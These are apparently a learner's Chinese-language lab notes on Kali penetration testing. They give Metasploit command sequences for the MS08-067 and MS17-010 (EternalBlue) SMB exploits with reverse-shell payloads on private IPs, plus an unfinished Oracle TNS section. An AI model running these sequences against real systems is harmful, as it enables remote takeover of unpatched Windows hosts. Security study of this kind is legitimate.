# Kali 网络服务渗透学习

## ms08_067 渗透学习
### 概述
* 这个漏洞利用445端口，主要用于windows 2000、windows 2003和 xp系统
* 溢出成功后，直接获得最高权限
* 一般用于内网渗透
* 高可靠
* 有时LHOST不正确，会导致目标机器的SMB服务崩溃
### 指令
```
msf> search ms08_067
>use exploit/windows/smb/ms08_067_netapi
>show payloads #显示可用的payload
>set payload generic/shell_reverse_tcp #反向的
>show options
>show targets #看看支持哪些攻击目标，如果已经收集到目标的操作系统信息，选择详细的，否则使用自动的
>set RHOST 10.10.10.130
>set LPROT 5000
>set LHOST 10.10.10.129
>set target 7
>exploit
```

### 其他
* win7之后的永恒之蓝: ms17_010,待实践
```
msf>search ms17_010
>use exploit/windows/smb/ms17_010_eternalblue
>show payloads #显示可用的payload
>set payload generic/shell_reverse_tcp
>show options
>set RHOST 192.168.10.130
>set LHOST 192.168.10.131
>run
```
* 建议payload用windows/x64/meterpreter/reverse_tcp

## Oracle TNS 渗透学习
### 概述
* 漏洞针对Oracle TNS服务
* 端口 1521
* 影响版本 10.1.0.5~10.2.0.4
* 1521/tcp open  oracle-tns      Oracle TNS Listener 10.2.0.1.0 (for 32-bit Windows)
### 命令
TODO：需要构造与目标相同的环境，并修改利用脚本。